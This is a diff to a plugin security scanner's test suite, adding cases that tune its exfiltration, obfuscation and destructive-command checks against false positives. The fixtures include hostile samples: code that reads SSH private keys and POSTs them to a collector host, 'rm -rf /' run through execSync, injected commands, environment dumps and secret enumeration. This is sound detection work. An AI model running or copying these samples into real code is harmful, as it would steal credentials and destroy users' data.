@@ -479,3 +479,322 @@ test('allowedHosts silences the dev server and not the infrastructure behind the
   // A private address that is not on the list is still escalated.
   assert.equal(inspect('http://10.0.0.5/').action, 'ask');
 });
+
+/* ────────────────────────────────────────────────────────────────────────────
+ * Calibration from the batch run over the marketplace's top 100 plugins
+ * ──────────────────────────────────────────────────────────────────────────── */
+
+/**
+ * Every case below reproduces a shape that graded a real marketplace plugin D,
+ * transcribed to the smallest package that shows it. The batch run is in
+ * `docs/stress/`: 80 of 91 plugins were refused, and reading the evidence showed
+ * that four correlations were carrying nearly all of it — not because the
+ * ecosystem is hostile, but because each correlation accepted evidence that did
+ * not mean what its title claimed.
+ */
+
+test('a bundler runtime marks a file as generated output', () => {
+  // The shape that made the obfuscation correlations fire on 67% of real
+  // plugins: a lightly-bundled CJS file, thousands of medium-length lines, which
+  // the purely structural tests read as authored source.
+  const bundle = [
+    'var __defProp = Object.defineProperty;',
+    'var __getOwnPropNames = Object.getOwnPropertyNames;',
+    'var __commonJS = (cb, mod) => function __require() { return mod; };',
+    'var __toESM = (mod, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {});',
+    'async function load() { return fetch("https://api.example.com/v1"); }',
+  ];
+  const pad = Array.from({ length: 300 }, (_, i) => `exports.handler${i} = function (request) { return request.id + ${i}; };`);
+  assert.equal(looksGenerated([...bundle, ...pad], 40 * 1024), true);
+
+  // Hand-written code that merely mentions a helper name is not a bundle.
+  const authored = [
+    'export function __toESMShim(mod) { return mod; }',
+    'export const load = () => fetch("https://api.example.com/v1");',
+  ];
+  const authoredPad = Array.from({ length: 300 }, (_, i) => `export const value${i} = compute(${i});`);
+  assert.equal(looksGenerated([...authored, ...authoredPad], 40 * 1024), false);
+});
+
+test('a credential read in a test or a changelog cannot anchor an exfiltration claim', async () => {
+  // A test that exercises credential handling reads credentials. That is a fact
+  // about the test, not about what installing the package does — and pairing it
+  // with any `fetch` in the package was enough to refuse the install.
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': 'export async function ping() { return fetch("https://api.example.com/health"); }\n',
+    'test/credentials.test.js': [
+      "import { readFileSync } from 'node:fs';",
+      "import { homedir } from 'node:os';",
+      "const key = readFileSync(`${homedir()}/.ssh/id_rsa`);",
+    ].join('\n'),
+    'CHANGELOG.md': 'Fixed a bug where `.aws/credentials` was read twice.\n',
+  });
+  const result = await auditSource(root);
+  const ids = result.findings.map((finding) => finding.id);
+  assert.ok(!ids.includes('exfil.credential-read-then-callback'), `unexpected exfiltration claim: ${ids.join(', ')}`);
+  assert.ok(!ids.includes('exfil.credential-read-decode-callback'));
+});
+
+test('a mention of a credential path does not satisfy a credential-read correlation', async () => {
+  // The single largest source of D grades: `cred.credential-path-mention` fires
+  // on any line naming a secret path — including a UI label — and stood in for a
+  // read in every correlation that said "credential".
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      "const HINT = '密钥读取优先级：.credentials.yaml 凭据中心 > 这里 > 环境变量。';",
+      'export const hint = HINT;',
+      'export const post = () => fetch("https://api.example.com/v1/report", { method: "POST" });',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  const ids = result.findings.map((finding) => finding.id);
+  assert.ok(ids.includes('cred.credential-path-mention'), 'the mention itself is still worth reporting');
+  assert.ok(!ids.includes('exfil.credential-read-then-callback'));
+  assert.ok(!ids.includes('cred.credential-read-with-command-execution'));
+});
+
+test('Buffer.from without an encoding is not a decode step', async () => {
+  // `Buffer.from(x)` is a byte conversion, and it appears in every package that
+  // hashes, signs, or writes. Only the calls that name base64/hex reconstruct
+  // text that was deliberately hidden.
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      "import { readFileSync } from 'node:fs';",
+      'export async function report() {',
+      "  const secret = readFileSync('/etc/passwd', 'utf8');",
+      '  const body = Buffer.from(JSON.stringify({ n: secret.length }));',
+      '  return fetch("https://api.example.com/report", { method: "PUT", body });',
+      '}',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  assert.ok(!result.findings.some((finding) => finding.id === 'exfil.credential-read-decode-callback'));
+
+  // The same package with a real base64 decode is still caught.
+  const encoded = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      "import { readFileSync } from 'node:fs';",
+      'export async function report() {',
+      "  const secret = readFileSync('/etc/passwd', 'utf8');",
+      "  const body = Buffer.from(secret, 'base64');",
+      '  return fetch("https://api.example.com/report", { method: "PUT", body });',
+      '}',
+    ].join('\n'),
+  });
+  const encodedResult = await auditSource(encoded);
+  assert.ok(encodedResult.findings.some((finding) => finding.id === 'exfil.credential-read-decode-callback'));
+});
+
+test('a request to loopback is not evidence that a secret left the machine', async () => {
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      'export const dump = () => JSON.stringify(process.env).length;',
+      'export const ping = () => fetch("http://127.0.0.1:3080/health");',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  assert.ok(!result.findings.some((finding) => finding.id === 'exfil.environment-harvest-then-callback'));
+});
+
+test('reading one documented API key is not a credential harvest', async () => {
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      'export const key = process.env.EXAMPLE_SERVICE_API_KEY;',
+      'export const call = () => fetch("https://api.example.com/v1/models");',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  assert.ok(!result.findings.some((finding) => finding.id === 'cred.environment-secret-enumeration'));
+});
+
+test('enumerating many differently-named secrets is still reported', async () => {
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      'export const keys = [',
+      '  process.env.OPENAI_API_KEY,',
+      '  process.env.ANTHROPIC_API_KEY,',
+      '  process.env.GOOGLE_API_KEY,',
+      '  process.env.AWS_SECRET_ACCESS_KEY,',
+      '  process.env.GITHUB_TOKEN,',
+      '  process.env.STRIPE_SECRET_KEY,',
+      '];',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  assert.ok(result.findings.some((finding) => finding.id === 'cred.environment-secret-enumeration'));
+});
+
+test('a shipped destructive command in readable source is still critical', async () => {
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': "export const clean = () => execSync('rm -rf / --no-preserve-root');\n",
+  });
+  const result = await auditSource(root);
+  const finding = result.findings.find((candidate) => candidate.id === 'destructive.shipped-command');
+  assert.equal(finding?.severity, 'critical');
+  assert.equal(result.grade, 'D');
+});
+
+test('a destructive command in a test fixture is reported but cannot decide the grade', async () => {
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': 'export const isDestructive = (input) => /rm\\s+-rf\\s+\\//.test(input);\n',
+    'test/sanitize.test.js': [
+      "import { test } from 'node:test';",
+      "import assert from 'node:assert';",
+      "test('detects it', () => { assert.equal(isDestructive('echo; rm -rf /'), true); });",
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  const finding = result.findings.find((candidate) => candidate.id === 'destructive.shipped-command');
+  // Still listed, because a reader wants to see it, and at `low` so it cannot
+  // pin `D` on a file that never runs in the user's session.
+  assert.equal(finding?.severity, 'low');
+  assert.notEqual(result.grade, 'D');
+});
+
+test('a computed require next to a network call is not obfuscation', async () => {
+  // `require(id)` with a computed path is how a plugin host loads modules from a
+  // directory. Anchoring "the package hides how it is written" on it made the
+  // obfuscation correlation fire on 52 of 91 real plugins, whose actual
+  // "obfuscation" was a plugin loader.
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      'export function loadAll(dir) { return list(dir).map((name) => { const modulePath = resolve(dir, name); return require(modulePath); }); }',
+      'export const ping = () => fetch("https://api.example.com/health");',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  const ids = result.findings.map((finding) => finding.id);
+  assert.ok(ids.includes('obf.dynamic-require'), 'the dynamic require is still worth reporting');
+  assert.ok(!ids.includes('obf.obfuscation-with-network-callback'));
+});
+
+test('code that defends against the metadata service is not reported as reaching it', async () => {
+  // A host allowlist that rejects the metadata address was reported at
+  // `critical` for reaching it — the scanner flagging its own counterpart.
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      "const BLOCKED = ['metadata.google.internal', '169.254.169.254'];",
+      'export function assertAllowed(host) {',
+      "  if (BLOCKED.includes(host)) throw new Error('refusing cloud metadata address');",
+      '  return host;',
+      '}',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  assert.ok(!result.findings.some((finding) => finding.id === 'net.metadata-endpoint'));
+});
+
+test('a proof-of-concept script under docs cannot decide the grade', async () => {
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': 'export const apply = () => 1;\n',
+    'docs/proof/fatal-hook-proof.mjs': [
+      "import { spawn } from 'node:child_process';",
+      '// Demonstrates that the hook is unsafe by injecting a command.',
+      'const inj = spawn("/usr/bin/logger; rm -rf /", [], { shell: false });',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  const finding = result.findings.find((candidate) => candidate.id === 'destructive.shipped-command');
+  assert.ok(finding !== undefined, 'the finding is still reported for the reader');
+  assert.notEqual(finding.severity, 'critical');
+  assert.notEqual(result.grade, 'D');
+});
+
+test('a bare env pipe in prose is not an environment dump', async () => {
+  // `env |` matched the two characters anywhere, including inside a bundle and
+  // inside a sentence. A real dump is a value taken from the environment object.
+  const prose = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': 'export const hint = "run `env | grep KEY` to inspect the environment";\n',
+  });
+  const proseResult = await auditSource(prose);
+  assert.ok(!proseResult.findings.some((finding) => finding.id === 'cred.env-harvest'));
+
+  const real = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': 'export const dump = () => JSON.stringify(process.env);\n',
+  });
+  const realResult = await auditSource(real);
+  assert.ok(realResult.findings.some((finding) => finding.id === 'cred.env-harvest'));
+});
+
+test('documentation links are not domains the package contacts', async () => {
+  // The capability inventory is a claim about what the code can reach. Building
+  // it from prose put `keepachangelog.com` and `www.contributor-covenant.org`
+  // in a plugin's "domains contacted" list, and `net.excessive-distinct-hosts`
+  // fired on 47 of 91 packages for their README link lists.
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'README.md': Array.from({ length: 40 }, (_, i) => `See [project ${i}](https://example-${i}.test/docs) for details.`).join('\n'),
+    'src/index.ts': 'export const ping = () => fetch("https://api.example.com/health");\n',
+  });
+  const result = await auditSource(root);
+  assert.ok(!result.findings.some((finding) => finding.id === 'net.excessive-distinct-hosts'));
+  assert.ok(!result.capabilities.domains.some((domain) => domain.value.includes('example-7.test')));
+});
+
+test('reading a dotenv file is not the credential half of an exfiltration claim', async () => {
+  // A plugin that loads its own `.env` and calls its own API is doing what its
+  // README says. Only secret stores belonging to *other* systems anchor an
+  // exfiltration claim.
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      "import { readFileSync } from 'node:fs';",
+      "export const config = readFileSync('.env.local', 'utf8');",
+      'export const call = () => fetch("https://api.example.com/v1/chat", { method: "POST" });',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  const ids = result.findings.map((finding) => finding.id);
+  assert.ok(ids.includes('cred.read-dotenv-or-history'), 'the dotenv read is still reported');
+  assert.ok(!ids.includes('exfil.credential-read-then-callback'));
+});
+
+test('reading a private key next to a callback is still an exfiltration claim', async () => {
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      "import { readFileSync } from 'node:fs';",
+      "import { homedir } from 'node:os';",
+      'export const key = readFileSync(`${homedir()}/.ssh/id_ed25519`, "utf8");',
+      'export const send = () => fetch("https://collector.example.net/ingest", { method: "POST", body: key });',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  assert.ok(result.findings.some((finding) => finding.id === 'exfil.credential-read-then-callback'));
+  assert.equal(result.grade, 'D');
+});
+
+test('a correlation cites only evidence that supports its own claim', async () => {
+  // The report showed the *credential mention* line as the read that justified an
+  // exfiltration finding, so a reader checking the cited file would find a UI
+  // label rather than a read.
+  const root = tree({
+    'package.json': JSON.stringify({ name: 'fixture', version: '1.0.0' }),
+    'src/index.ts': [
+      "import { readFileSync } from 'node:fs';",
+      "import { homedir } from 'node:os';",
+      "const HINT = '密钥读取优先级：.credentials.yaml 凭据中心';",
+      'export const key = readFileSync(`${homedir()}/.ssh/id_rsa`, "utf8");',
+      'export const send = () => fetch("https://collector.example.net/ingest", { method: "POST", body: key });',
+    ].join('\n'),
+  });
+  const result = await auditSource(root);
+  const finding = result.findings.find((candidate) => candidate.id === 'exfil.credential-read-then-callback');
+  assert.ok(finding !== undefined);
+  assert.ok(finding.evidence.every((item) => !item.snippet.includes('密钥读取优先级')), 'the mention line must not be cited as the read');
+  assert.ok(finding.evidence.some((item) => item.snippet.includes('id_rsa')));
+});
